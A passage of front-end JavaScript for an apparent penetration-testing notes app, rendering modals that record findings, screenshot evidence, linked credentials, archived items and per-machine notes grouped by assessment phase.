      fvmDrop.addEventListener('dragover', (e) => { e.preventDefault(); fvmDrop.classList.add('drag-over'); });
      fvmDrop.addEventListener('mouseenter', () => { fvmDrop.focus({ preventScroll: true }); });
      fvmDrop.addEventListener('dragleave', () => { fvmDrop.classList.remove('drag-over'); });
      fvmDrop.addEventListener('drop', (e) => { e.preventDefault(); fvmDrop.classList.remove('drag-over'); addFvmFiles(e.dataTransfer?.files || []); });
      fvmDrop.addEventListener('paste', (e) => { const f = getImageFilesFromList(e.clipboardData?.files || []); if (f.length) { e.preventDefault(); addFvmFiles(f); } });

      // Open existing evidence
      container.querySelectorAll('[data-fvm-open-evidence]').forEach(btn => {
        btn.addEventListener('click', () => openEvidencePreview(btn.dataset.fvmOpenEvidence));
      });

      // Delete existing evidence
      container.querySelectorAll('[data-fvm-rename-evidence]').forEach(btn => {
        btn.addEventListener('click', () => {
          const evId = btn.dataset.fvmRenameEvidence;
          const file = (finding.evidence || []).find(entry => entry.id === evId);
          if (!file) return;
          const nextName = window.prompt('Rename evidence file', file.name || 'evidence.png');
          if (!nextName || !nextName.trim()) return;
          const cleanName = nextName.trim();
          file.name = cleanName;
          fvmRenamedEvidenceNames.set(evId, cleanName);
          const fileBtn = container.querySelector('[data-fvm-open-evidence="' + evId + '"]');
          if (fileBtn) fileBtn.textContent = cleanName;
        });
      });

      container.querySelectorAll('[data-fvm-delete-evidence]').forEach(btn => {
        btn.addEventListener('click', () => {
          const evId = btn.dataset.fvmDeleteEvidence;
          fvmRemovedEvidenceIds.add(evId);
          fvmRenamedEvidenceNames.delete(evId);
          const row = container.querySelector('[data-fvm-existing="' + evId + '"]');
          if (row) row.remove();
        });
      });

      // Credential section: prompt toggle logic
      function refreshFvmCredentialSection() {
        const linkedHost = container.querySelector('#fvmLinkedCreds');
        const select = container.querySelector('#fvmLinkCredSelect');
        if (!linkedHost || !select) return;
        const creds = machineCredentials(finding.machine_id);
        const linked = creds.filter(c => c.finding_id === finding.id);
        linkedHost.innerHTML = linked.length
          ? linked.map(c => `
            <div class="finding-cred-row">
              <span class="mono">${(c.username || '').replace(/</g, '&lt;')}</span>
              <span class="small dim">${(c.service || c.cred_type || '').replace(/</g, '&lt;')}</span>
              <button type="button" class="icon-btn" data-fvm-unlink-cred="${c.id}" title="Unlink">×</button>
            </div>
          `).join('')
          : '<div class="small dim">No linked credentials.</div>';
        const options = creds
          .filter(c => !c.finding_id || c.finding_id === finding.id)
          .map(c => `<option value="${c.id}">${c.username}${c.service ? ` (${c.service})` : ''}</option>`)
          .join('');
        select.innerHTML = '<option value="">Select credential</option>' + options;
        select.addEventListener('change', () => {
          const credId = select.value;
          if (!credId) return;
          const cred = state.credentials.find(c => c.id === credId);
          if (!cred) return;
          cred.finding_id = finding.id;
          finding.updated_at = nowStamp();
          addActivity('updated_machine', `Linked credential "${cred.username}" to finding "${finding.title}"`, finding.machine_id);
          persist();
          refreshFvmCredentialSection();
        });
        linkedHost.querySelectorAll('[data-fvm-unlink-cred]').forEach(btn => {
          btn.addEventListener('click', () => {
            const cred = state.credentials.find(c => c.id === btn.dataset.fvmUnlinkCred);
            if (!cred) return;
            cred.finding_id = null;
            finding.updated_at = nowStamp();
            addActivity('updated_machine', `Unlinked credential "${cred.username}" from finding "${finding.title}"`, finding.machine_id);
            persist();
            refreshFvmCredentialSection();
          });
        });
      }

      container.querySelector('#fvmShowLinkCred')?.addEventListener('click', () => {
        const linkSec = container.querySelector('#fvmLinkCredSection');
        const createSec = container.querySelector('#fvmCreateCredSection');
        const linkBtn = container.querySelector('#fvmShowLinkCred');
        const createBtn = container.querySelector('#fvmShowCreateCred');
        if (linkSec.style.display === 'none') {
          linkSec.style.display = '';
          createSec.style.display = 'none';
          linkBtn.classList.add('active');
          createBtn.classList.remove('active');
        } else {
          linkSec.style.display = 'none';
          linkBtn.classList.remove('active');
        }
      });

      container.querySelector('#fvmShowCreateCred')?.addEventListener('click', () => {
        const linkSec = container.querySelector('#fvmLinkCredSection');
        const createSec = container.querySelector('#fvmCreateCredSection');
        const linkBtn = container.querySelector('#fvmShowLinkCred');
        const createBtn = container.querySelector('#fvmShowCreateCred');
        if (createSec.style.display === 'none') {
          createSec.style.display = '';
          linkSec.style.display = 'none';
          createBtn.classList.add('active');
          linkBtn.classList.remove('active');
        } else {
          createSec.style.display = 'none';
          createBtn.classList.remove('active');
        }
      });

      container.querySelector('#fvmCreateLinkCred')?.addEventListener('click', () => {
        const username = container.querySelector('#fvmNewCredUser')?.value.trim();
        if (!username) { container.querySelector('#fvmNewCredUser')?.focus(); return; }
        const credential = {
          id: uid('c'),
          machine_id: finding.machine_id,
          username,
          password: container.querySelector('#fvmNewCredPass')?.value || '',
          cred_type: container.querySelector('#fvmNewCredType')?.value || 'plain',
          service: container.querySelector('#fvmNewCredSvc')?.value || '',
          finding_id: finding.id,
          created_at: nowStamp(),
        };
        state.credentials.unshift(credential);
        finding.updated_at = nowStamp();
        addActivity('added_credential', `Added credential: ${credential.username} (${credential.service || credential.cred_type})`, credential.machine_id);
        addActivity('updated_machine', `Linked credential "${credential.username}" to finding "${finding.title}"`, finding.machine_id);
        container.querySelector('#fvmNewCredUser').value = '';
        container.querySelector('#fvmNewCredPass').value = '';
        container.querySelector('#fvmNewCredSvc').value = '';
        container.querySelector('#fvmNewCredType').value = 'plain';
        persist();
        refreshFvmCredentialSection();
      });

      refreshFvmCredentialSection();

      container.querySelector('#fvmCancel').addEventListener('click', () => renderView(false));
      container.querySelector('#fvmSave').addEventListener('click', async () => {
        const title = document.getElementById('fvmTitle').value.trim();
        if (!title) return;
        finding.title = title;
        finding.description = document.getElementById('fvmDesc').value;
        finding.severity = document.getElementById('fvmSev').value;
        finding.phase = document.getElementById('fvmPhase').value;
        finding.parent_id = document.getElementById('fvmParentId').value || null;
        finding.updated_at = nowStamp();

        for (const [evId, newName] of fvmRenamedEvidenceNames.entries()) {
          if (!fvmRemovedEvidenceIds.has(evId)) {
            await updateEvidenceRecordName(evId, newName);
          }
        }

        for (const evId of fvmRemovedEvidenceIds) {
          await deleteEvidenceFile(evId);
        }

        // Store new evidence files
        const newEvidence = [];
        for (const file of fvmEvidenceBuffer) {
          const stored = await putEvidenceFile(file);
          newEvidence.push(stored);
        }

        // Merge: keep existing (minus removed) + add new
        finding.evidence = [
          ...(finding.evidence || []).filter(f => !fvmRemovedEvidenceIds.has(f.id)),
          ...newEvidence,
        ];

        const totalAdded = newEvidence.length;
        const totalRemoved = fvmRemovedEvidenceIds.size;
        let evidenceNote = '';
        if (totalAdded || totalRemoved) {
          const parts = [];
          if (totalAdded) parts.push('+' + totalAdded + ' evidence');
          if (totalRemoved) parts.push('-' + totalRemoved + ' evidence');
          evidenceNote = ' (' + parts.join(', ') + ')';
        }
        addActivity('updated_machine', 'Edited finding: ' + finding.title + ' [' + finding.severity.toUpperCase() + ' | ' + finding.phase + ']' + evidenceNote, finding.machine_id);
        modal.close();
        mount();
      });
    } else {
      const sevBadge = severityClass[finding.severity] || 'severity-info';
      const createdText = formatDateTimeMilitary(finding.created_at);
      const changedText = formatDateTimeMilitary(finding.updated_at || finding.created_at);
      container.innerHTML = `
        <div class="finding-modal-header">
          <div class="finding-modal-title-row">
            <span class="sev-badge ${sevBadge}">${finding.severity.toUpperCase()}</span>
            <h2 style="margin:0;font-size:1.1rem">${finding.title}</h2>
            <span class="badge">${finding.phase}</span>
          </div>
          <div class="finding-modal-meta">
            <div class="finding-modal-meta-row"><span>Creation:</span><strong>${createdText}</strong></div>
            <div class="finding-modal-meta-row"><span>Last Changed:</span><strong>${changedText}</strong></div>
          </div>
        </div>
        ${finding.description ? `<p style="margin:.65rem 0;color:var(--muted)">${finding.description}</p>` : '<p class="dim small" style="margin:.65rem 0">No description</p>'}
        ${(finding.evidence || []).length ? `
          <div style="margin:.5rem 0">
            <p class="small dim" style="margin-bottom:.3rem">Evidence</p>
            ${(finding.evidence || []).map(file => `
              <div class="evidence-row"><button class="btn btn-ghost evidence-open" data-modal-evidence="${file.id}" type="button">${file.name}</button></div>
            `).join('')}
          </div>
        ` : ''}
        <div class="modal-actions">
          <button class="btn btn-ghost" id="fvmClose">Close</button>
          <button class="btn btn-primary" id="fvmEdit">Edit</button>
        </div>
      `;
      container.querySelector('#fvmClose').addEventListener('click', () => modal.close());
      container.querySelector('#fvmEdit').addEventListener('click', () => renderView(true));
      container.querySelectorAll('[data-modal-evidence]').forEach(btn => {
        btn.addEventListener('click', () => openEvidencePreview(btn.dataset.modalEvidence));
      });
    }
  }

  renderView(false);
  showDialogSafely(modal);
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

/* ═══════════════════════════════════════════════
   Findings Modal
   ═══════════════════════════════════════════════ */
function openFindingsModal(machine) {
  const modal = document.getElementById('findingsModal');
  const container = document.getElementById('findingsModalContent');
  if (!modal || !container) return;

  let showForm = false;
  let evidenceBuffer = [];

  function renderFindingEvidenceBufferList() {
    const list = container.querySelector('#fmEvidenceList');
    if (!list) return;
    list.innerHTML = evidenceBuffer.map((file, i) => `
      <div class="evidence-row">
        <span class="small">${file.name}</span>
        <button class="icon-btn" data-rm-buf="${i}" type="button" title="Remove">🗑</button>
      </div>
    `).join('');
    list.querySelectorAll('[data-rm-buf]').forEach(btn => {
      btn.addEventListener('click', () => { evidenceBuffer.splice(Number(btn.dataset.rmBuf), 1); renderFindingEvidenceBufferList(); });
    });
  }

  function addToEvidenceBuffer(files) {
    const imgs = getImageFilesFromList(files);
    if (!imgs.length) return;
    evidenceBuffer.push(...imgs);
    renderFindingEvidenceBufferList();
  }

  function renderContent() {
    const findings = machineFindings(machine.id);

    container.innerHTML = `
      <div class="fm-header">
        <h2>Findings <span class="badge">${findings.length}</span></h2>
        <button class="btn btn-ghost" id="fmClose">✕</button>
      </div>
      <div class="fm-body">
        <div class="fm-toolbar">
          <button class="btn btn-primary btn-sm" id="fmAddBtn">+ Add Finding</button>
        </div>
        ${showForm ? `
          <div class="inline-form card" style="margin-bottom:1rem">
            <label>Title *<input id="fmTitle" placeholder="Apache 2.4.49 Path Traversal"></label>
            <label>Description<textarea id="fmDesc" rows="3" style="width:100%;margin-top:.4rem;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.55rem .6rem"></textarea></label>
            <div class="split">
              <label>Severity
                <select id="fmSeverity">
                  <option value="critical">Critical</option>
                  <option value="high" selected>High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                  <option value="info">Info</option>
                </select>
              </label>
              <label>Phase
                <select id="fmPhase">${checklistPhases.map(p => `<option value="${p.id}">${p.name}</option>`).join('')}</select>
              </label>
            </div>
            <label>Parent Finding
              <select id="fmParent">
                <option value="">Root Level (no parent)</option>
                ${(() => {
                  const firstPhase = checklistPhases[0]?.id || '';
                  const epFm = buildEligibleParents(machine.id, firstPhase, new Set());
                  let o = epFm.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
                  if (epFm.crossPhase.length) {
                    o += `<optgroup label="Cross-phase (${epFm.prevPhaseId})">` +
                      epFm.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') + '</optgroup>';
                  }
                  return o;
                })()}
              </select>
            </label>
            <input id="fmEvidenceInput" type="file" accept="image/*" multiple style="display:none">
            <div class="evidence-dropzone" id="fmEvidenceDrop" tabindex="0">Drop screenshots here or click / Ctrl+V to paste</div>
            <div class="evidence-list" id="fmEvidenceList"></div>
            <div class="modal-actions">
              <button class="btn btn-ghost" id="fmCancelForm">Cancel</button>
              <button class="btn btn-primary" id="fmSubmitForm">Add Finding</button>
            </div>
          </div>
        ` : ''}
        ${!findings.length ? '<p class="small dim" style="padding:1rem;text-align:center">No findings documented yet.</p>' : `
          <div class="finding-list">
            ${(() => {
              const knownPhases = ['osint','recon','exploitation','post_exploitation','persistence'];
              let html = knownPhases.map(pid => {
                const phase = checklistPhases.find(p => p.id === pid);
                const phaseFindings = findings.filter(f => (f.phase || 'unknown') === pid);
                if (!phaseFindings.length) return '';
                const pColor = phaseColor(pid);
                return `
                  <div class="fm-phase-group">
                    <div class="fm-phase-header" style="--phase-col:${pColor}">
                      <span class="fm-phase-dot" style="background:${pColor}"></span>
                      <span class="fm-phase-name">${phase ? phase.name : pid}</span>
                      <span class="badge" style="background:${pColor}22;color:${pColor};border-color:${pColor}55">${phaseFindings.length}</span>
                    </div>
                    ${buildFindingCards(phaseFindings, null, 0)}
                  </div>
                `;
              }).join('');
              const otherFindings = findings.filter(f => !knownPhases.includes(f.phase || 'unknown'));
              if (otherFindings.length) {
                html += `
                  <div class="fm-phase-group">
                    <div class="fm-phase-header" style="--phase-col:var(--text)">
                      <span class="fm-phase-dot" style="background:var(--muted)"></span>
                      <span class="fm-phase-name">Other</span>
                      <span class="badge">${otherFindings.length}</span>
                    </div>
                    ${buildFindingCards(otherFindings, null, 0)}
                  </div>
                `;
              }
              return html;
            })()}
          </div>
        `}
        ${(() => {
          const archEv = machine.archived_evidence || [];
          const archCr = machine.archived_credentials || [];
          if (!archEv.length && !archCr.length) return '';
          return `
            <div class="fm-archived-section">
              <div class="fm-archived-header" id="fmArchivedToggle">
                <span class="fm-archived-icon">📦</span>
                <span>Archived</span>
                <span class="badge" style="background:rgba(234,179,8,.15);color:#eab308;border-color:rgba(234,179,8,.35)">${archEv.length + archCr.length}</span>
                <span class="fm-archived-chevron">▸</span>
              </div>
              <div class="fm-archived-body" style="display:none">
                ${archEv.length ? `
                  <div class="fm-archived-group">
                    <div class="fm-archived-group-label">📓 Archived Evidence (${archEv.length})</div>
                    ${archEv.map(ev => `
                      <div class="finding-card" style="border-color:rgba(234,179,8,.25)">
                        <div class="finding-main">
                          <div class="finding-head">
                            <span class="badge" style="background:rgba(234,179,8,.15);color:#eab308;border-color:rgba(234,179,8,.35)">Archived</span>
                            <span class="small dim">from: ${ev.source_finding_title || 'Unknown finding'}</span>
                          </div>
                          <div class="evidence-list" style="margin-top:.35rem">
                            <div class="evidence-row">
                              <button class="btn btn-ghost evidence-open" data-archived-ev-open="${ev.id}" type="button">📄 ${ev.name}</button>
                            </div>
                          </div>
                        </div>
                        <div class="finding-actions">
                          <button class="icon-btn" data-delete-archived-ev="${ev.id}" title="Permanently Delete">🗑</button>
                        </div>
                      </div>
                    `).join('')}
                  </div>
                ` : ''}
                ${archCr.length ? `
                  <div class="fm-archived-group">
                    <div class="fm-archived-group-label">🔑 Archived Credentials (${archCr.length})</div>
                    ${archCr.map(c => `
                      <div class="finding-card" style="border-color:rgba(234,179,8,.25)">
                        <div class="finding-main">
                          <div class="finding-head">
                            <span class="badge" style="background:rgba(234,179,8,.15);color:#eab308;border-color:rgba(234,179,8,.35)">Archived</span>
                            <span class="small dim">from: ${c.source_finding_title || 'Unknown finding'}</span>
                          </div>
                          <div style="margin-top:.35rem">
                            <span class="small"><strong>${c.username}</strong> ${c.service ? `· ${c.service}` : ''} ${c.cred_type ? `(${c.cred_type})` : ''}</span>
                          </div>
                        </div>
                        <div class="finding-actions">
                          <button class="icon-btn" data-restore-archived-cred="${c.id}" title="Restore to Active Credentials">↩</button>
                          <button class="icon-btn" data-delete-archived-cred="${c.id}" title="Permanently Delete">🗑</button>
                        </div>
                      </div>
                    `).join('')}
                  </div>
                ` : ''}
              </div>
            </div>
          `;
        })()}
      </div>
    `;

    /* close */
    container.querySelector('#fmClose').addEventListener('click', () => modal.close());

    /* toggle add form */
    container.querySelector('#fmAddBtn').addEventListener('click', () => {
      showForm = !showForm;
      evidenceBuffer = [];
      renderContent();
    });

    if (showForm) {
      const titleInput = container.querySelector('#fmTitle');
      titleInput?.focus();

      container.querySelector('#fmCancelForm').addEventListener('click', () => { showForm = false; evidenceBuffer = []; renderContent(); });

      const fileInput = container.querySelector('#fmEvidenceInput');
      const dropzone  = container.querySelector('#fmEvidenceDrop');
      dropzone?.addEventListener('click', () => fileInput?.click());
      fileInput?.addEventListener('change', e => { addToEvidenceBuffer(e.target.files || []); e.target.value = ''; });
      dropzone?.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('drag-over'); });
      dropzone?.addEventListener('dragleave', () => dropzone.classList.remove('drag-over'));
      dropzone?.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('drag-over'); addToEvidenceBuffer(e.dataTransfer?.files || []); });
      dropzone?.addEventListener('paste', e => { const imgs = getImageFilesFromList(e.clipboardData?.files || []); if (imgs.length) { e.preventDefault(); addToEvidenceBuffer(imgs); } });
      dropzone?.addEventListener('mouseenter', () => dropzone.focus({ preventScroll: true }));

      container.querySelector('#fmPhase')?.addEventListener('change', e => {
        const sel = container.querySelector('#fmParent');
        if (!sel) return;
        const epFm = buildEligibleParents(machine.id, e.target.value, new Set());
        let opts = '<option value="">Root Level (no parent)</option>';
        opts += epFm.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
        if (epFm.crossPhase.length) {
          const prevLabel = checklistPhases.find(p => p.id === epFm.prevPhaseId)?.name || epFm.prevPhaseId;
          opts += `<optgroup label="Cross-phase (${prevLabel})">` +
            epFm.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') + '</optgroup>';
        }
        sel.innerHTML = opts;
      });

      container.querySelector('#fmSubmitForm').addEventListener('click', async () => {
        const title = container.querySelector('#fmTitle').value.trim();
        if (!title) { container.querySelector('#fmTitle').focus(); return; }
        const evidenceFiles = [...evidenceBuffer];
        const evidence = [];
        for (const file of evidenceFiles) { evidence.push(await putEvidenceFile(file)); }
        state.findings.unshift({
          id: uid('f'),
          machine_id: machine.id,
          title,
          description: container.querySelector('#fmDesc').value,
          severity: container.querySelector('#fmSeverity').value,
          phase: container.querySelector('#fmPhase').value,
          parent_id: container.querySelector('#fmParent')?.value || null,
          category: 'finding',
          evidence,
          created_at: nowStamp(),
          updated_at: nowStamp(),
        });
        addActivity('added_finding', `Added finding: ${title} with ${evidence.length} evidence file(s)`, machine.id);
        showForm = false;
        evidenceBuffer = [];
        persist();
        mount();
        renderContent();
      });
    }

    /* delete finding (archives evidence & credentials) */
    container.querySelectorAll('[data-delete-finding]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const finding = state.findings.find(f => f.id === btn.dataset.deleteFinding);
        if (!finding) return;
        if (!confirm(`Delete finding "${finding.title}"?\n\nAny tied evidence and credentials will be moved to the Archived section.`)) return;

        if (!machine.archived_evidence) machine.archived_evidence = [];
        if (!machine.archived_credentials) machine.archived_credentials = [];

        /* Archive evidence */
        for (const ev of (finding.evidence || [])) {
          machine.archived_evidence.push({
            ...ev,
            archived_at: new Date().toISOString(),
            source_finding_title: finding.title,
            source_finding_id: finding.id,
            source_type: 'finding_deleted_manually',
          });
        }

        /* Archive credentials linked to this finding */
        const linkedCreds = state.credentials.filter(c => c.finding_id === finding.id);
        for (const cred of linkedCreds) {
          machine.archived_credentials.push({
            ...cred,
            finding_id: null,
            archived_at: new Date().toISOString(),
            source_finding_title: finding.title,
            source_finding_id: finding.id,
            source_type: 'finding_deleted_manually',
          });
          state.credentials = state.credentials.filter(c => c.id !== cred.id);
        }

        state.findings = state.findings.filter(f => f.id !== finding.id);
        const archivedCount = (finding.evidence || []).length + linkedCreds.length;
        addActivity('updated_machine', `Deleted finding: ${finding.title}${archivedCount ? `. Archived ${archivedCount} item(s).` : ''}`, machine.id);
        persist();
        mount();
        renderContent();
      });
    });

    /* edit finding (pencil button) */
    container.querySelectorAll('[data-edit-finding]').forEach(btn => {
      btn.addEventListener('click', () => openFindingEditModal(btn.dataset.editFinding));
    });

    /* open finding evidence files */
    container.querySelectorAll('[data-open-finding-evidence]').forEach(btn => {
      btn.addEventListener('click', () => openEvidencePreview(btn.dataset.openFindingEvidence));
    });

    /* delete finding evidence */
    container.querySelectorAll('[data-delete-finding-evidence]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const finding = state.findings.find(f => f.id === btn.dataset.findingId);
        if (!finding) return;
        await deleteEvidenceFile(btn.dataset.deleteFindingEvidence);
        finding.evidence = (finding.evidence || []).filter(f => f.id !== btn.dataset.deleteFindingEvidence);
        finding.updated_at = nowStamp();
        addActivity('updated_machine', `Removed evidence from finding: ${finding.title}`, machine.id);
        persist();
        mount();
        renderContent();
      });
    });

    /* rename finding evidence */
    container.querySelectorAll('[data-rename-finding-evidence]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const finding = state.findings.find(f => f.id === btn.dataset.findingId);
        if (!finding) return;
        const file = (finding.evidence || []).find(f => f.id === btn.dataset.renameFindingEvidence);
        if (!file) return;
        const name = window.prompt('Rename evidence file', file.name || 'evidence.png');
        if (!name?.trim()) return;
        file.name = name.trim();
        finding.updated_at = nowStamp();
        await updateEvidenceRecordName(btn.dataset.renameFindingEvidence, name.trim());
        addActivity('updated_machine', `Renamed evidence on "${finding.title}"`, machine.id);
        persist();
        renderContent();
      });
    });

    /* ── Archived section toggle ── */
    container.querySelector('#fmArchivedToggle')?.addEventListener('click', () => {
      const body = container.querySelector('.fm-archived-body');
      const chevron = container.querySelector('.fm-archived-chevron');
      if (!body) return;
      const isHidden = body.style.display === 'none';
      body.style.display = isHidden ? 'block' : 'none';
      if (chevron) chevron.textContent = isHidden ? '▾' : '▸';
    });

    /* open archived evidence */
    container.querySelectorAll('[data-archived-ev-open]').forEach(btn => {
      btn.addEventListener('click', () => openEvidencePreview(btn.dataset.archivedEvOpen));
    });

    /* permanently delete archived evidence */
    container.querySelectorAll('[data-delete-archived-ev]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const evId = btn.dataset.deleteArchivedEv;
        if (!confirm('Permanently delete this archived evidence file?')) return;
        await deleteEvidenceFile(evId);
        machine.archived_evidence = (machine.archived_evidence || []).filter(e => e.id !== evId);
        addActivity('updated_machine', `Permanently deleted archived evidence: ${evId}`, machine.id);
        persist();
        renderContent();
      });
    });

    /* restore archived credential to active */
    container.querySelectorAll('[data-restore-archived-cred]').forEach(btn => {
      btn.addEventListener('click', () => {
        const credId = btn.dataset.restoreArchivedCred;
        const archCred = (machine.archived_credentials || []).find(c => c.id === credId);
        if (!archCred) return;
        const { archived_at, source_finding_title, source_finding_id, source_type, ...restoredCred } = archCred;
        state.credentials.unshift(restoredCred);
        machine.archived_credentials = machine.archived_credentials.filter(c => c.id !== credId);
        addActivity('updated_machine', `Restored archived credential: ${restoredCred.username}`, machine.id);
        persist();
        renderContent();
      });
    });

    /* permanently delete archived credential */
    container.querySelectorAll('[data-delete-archived-cred]').forEach(btn => {
      btn.addEventListener('click', () => {
        const credId = btn.dataset.deleteArchivedCred;
        if (!confirm('Permanently delete this archived credential?')) return;
        machine.archived_credentials = (machine.archived_credentials || []).filter(c => c.id !== credId);
        addActivity('updated_machine', `Permanently deleted archived credential`, machine.id);
        persist();
        renderContent();
      });
    });
  }

  renderContent();
  showDialogSafely(modal);
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
  });
}

/* ═══════════════════════════════════════════════
   Notes Modal
   ═══════════════════════════════════════════════ */
function openNotesModal(machine) {
  const modal = document.getElementById('notesModal');
  const container = document.getElementById('notesModalContent');
  if (!modal || !container) return;

  container.innerHTML = `
    <div class="fm-header">
      <h2>📝 Notes — ${machine.ip}</h2>
      <button class="btn btn-ghost" id="nmClose">✕</button>
    </div>
    <div class="fm-body">
      <textarea id="nmTextarea" rows="20" style="width:100%;background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:.45rem;padding:.65rem .75rem;font-size:.88rem;line-height:1.6;resize:vertical" placeholder="Write your notes here...">${(machine.notes || '').replace(/</g, '&lt;')}</textarea>
      <p class="small dim" style="margin-top:.4rem">Auto-saved when you click away.</p>
    </div>
  `;

  container.querySelector('#nmClose').addEventListener('click', () => {
    machine.notes = container.querySelector('#nmTextarea').value;
    if (machine.notes) addActivity('updated_machine', `Updated notes for ${machine.ip} (${machine.notes.length} chars)`, machine.id);
    persist();
    modal.close();
  });

  container.querySelector('#nmTextarea').addEventListener('blur', e => {
    machine.notes = e.target.value;
    if (machine.notes) addActivity('updated_machine', `Updated notes for ${machine.ip} (${machine.notes.length} chars)`, machine.id);
    persist();
  });

  showDialogSafely(modal);
  container.querySelector('#nmTextarea').focus();
  modal.addEventListener('click', function backdropClose(e) {
    if (e.target === modal) {
      machine.notes = container.querySelector('#nmTextarea')?.value ?? machine.notes;
      persist();
      modal.close();
      modal.removeEventListener('click', backdropClose);
    }
  });
}

/* ═══════════════════════════════════════════════
   Evidence Modal
   ═══════════════════════════════════════════════ */
function openEvidenceModal(machine) {
  const modal = document.getElementById('evidenceModal');
  const container = document.getElementById('evidenceModalContent');
  if (!modal || !container) return;

  function itemPhase(itemId) {
    for (const phase of checklistPhases) {
      if (phase.items.some(i => i.id === itemId)) return phase.id;
    }
    return 'unknown';
  }

  function itemName(itemId) {
    for (const phase of checklistPhases) {
      const item = phase.items.find(i => i.id === itemId);
      if (item) return item.name;
    }
    return itemId;
  }

  function renderContent() {
    const findings = machineFindings(machine.id);
    const evidenceItems = [];

    /* Collect finding evidence */
    findings.forEach(f => {
      (f.evidence || []).forEach(ev => {
        evidenceItems.push({
          id: ev.id,
          name: ev.name,
          phase: f.phase || 'unknown',
          source: 'finding',
          sourceLabel: f.title,
          severity: f.severity,
          findingId: f.id,
        });
      });
    });

    /* Collect checklist item evidence */
    Object.entries(machine.item_evidence || {}).forEach(([itemId, files]) => {
      const phase = itemPhase(itemId);
      files.forEach(ev => {
        evidenceItems.push({
          id: ev.id,
          name: ev.name,
          phase,
          source: 'checklist',
          sourceLabel: itemName(itemId),
          itemId,
        });
      });
    });

    container.innerHTML = `
      <div class="fm-header">
        <h2>📓 Evidence <span class="badge">${evidenceItems.length}</span></h2>
        <button class="btn btn-ghost" id="evmClose">✕</button>
      </div>
      <div class="fm-body">
        ${!evidenceItems.length ? '<p class="small dim" style="padding:1rem;text-align:center">No evidence files yet. Add evidence via Findings or Checklist items.</p>' : `
          <div class="finding-list">
            ${(() => {
              const knownPhases = ['osint','recon','exploitation','post_exploitation','persistence'];
              let html = knownPhases.map(pid => {
              const phase = checklistPhases.find(p => p.id === pid);
              const phaseEvidence = evidenceItems.filter(e => e.phase === pid);
              if (!phaseEvidence.length) return '';
              const pColor = phaseColor(pid);
              return `
                <div class="fm-phase-group">
                  <div class="fm-phase-header" style="--phase-col:${pColor}">
                    <span class="fm-phase-dot" style="background:${pColor}"></span>
                    <span class="fm-phase-name">${phase ? phase.name : pid}</span>
                    <span class="badge" style="background:${pColor}22;color:${pColor};border-color:${pColor}55">${phaseEvidence.length}</span>
                  </div>
                  ${phaseEvidence.map(ev => `
                    <div class="finding-card">
                      <div class="finding-main">
                        <div class="finding-head">
                          <span class="badge">${ev.source === 'finding' ? '🔍 Finding' : '☑ Checklist'}</span>
                          <span class="small dim">${ev.sourceLabel}</span>
                          ${ev.severity ? `<span class="sev-badge ${severityClass[ev.severity] || 'severity-info'}">${ev.severity.toUpperCase()}</span>` : ''}
                        </div>
                        <div class="evidence-list" style="margin-top:.35rem">
                          <div class="evidence-row">
                            <button class="btn btn-ghost evidence-open" data-ev-open="${ev.id}" type="button">📄 ${ev.name}</button>
                          </div>
                        </div>
                      </div>
                    </div>
                  `).join('')}
                </div>
              `;
            }).join('');
              const otherEvidence = evidenceItems.filter(e => !knownPhases.includes(e.phase));
              if (otherEvidence.length) {
                html += `
                  <div class="fm-phase-group">
                    <div class="fm-phase-header" style="--phase-col:var(--text)">
                      <span class="fm-phase-dot" style="background:var(--muted)"></span>
                      <span class="fm-phase-name">Other</span>
                      <span class="badge">${otherEvidence.length}</span>
                    </div>
                    ${otherEvidence.map(ev => `
                      <div class="finding-card">
                        <div class="finding-main">
                          <div class="finding-head">
                            <span class="badge">${ev.source === 'finding' ? '🔍 Finding' : '☑ Checklist'}</span>
                            <span class="small dim">${ev.sourceLabel}</span>
                            ${ev.severity ? `<span class="sev-badge ${severityClass[ev.severity] || 'severity-info'}">${ev.severity.toUpperCase()}</span>` : ''}
                          </div>
                          <div class="evidence-list" style="margin-top:.35rem">
                            <div class="evidence-row">
                              <button class="btn btn-ghost evidence-open" data-ev-open="${ev.id}" type="button">📄 ${ev.name}</button>
                            </div>
                          </div>
                        </div>
                      </div>
                    `).join('')}
                  </div>
                `;
              }
              return html;
            })()}
          </div>
        `}
        ${(() => {
          const archEv = machine.archived_evidence || [];
          if (!archEv.length) return '';
          return `
            <div class="fm-archived-section">
              <div class="fm-archived-header" id="evmArchivedToggle">
                <span class="fm-archived-icon">📦</span>
                <span>Archived Evidence</span>
                <span class="badge" style="background:rgba(234,179,8,.15);color:#eab308;border-color:rgba(234,179,8,.35)">${archEv.length}</span>
                <span class="fm-archived-chevron">▸</span>
              </div>
              <div class="fm-archived-body" id="evmArchivedBody" style="display:none">
                ${archEv.map(ev => `
                  <div class="finding-card" style="border-color:rgba(234,179,8,.25)">
                    <div class="finding-main">
                      <div class="finding-head">
                        <span class="badge" style="background:rgba(234,179,8,.15);color:#eab308;border-color:rgba(234,179,8,.35)">Archived</span>
                        <span class="small dim">from: ${ev.source_finding_title || 'Unknown finding'}</span>
                      </div>
                      <div class="evidence-list" style="margin-top:.35rem">
                        <div class="evidence-row">
                          <button class="btn btn-ghost evidence-open" data-evm-archived-open="${ev.id}" type="button">📄 ${ev.name}</button>
                        </div>
                      </div>
                    </div>
                    <div class="finding-actions">
                      <button class="icon-btn" data-evm-delete-archived="${ev.id}" title="Permanently Delete">🗑</button>
                    </div>
                  </div>
                `).join('')}
              </div>
            </div>
          `;
        })()}
      </div>
    `;

    container.querySelector('#evmClose')?.addEventListener('click', () => modal.close());

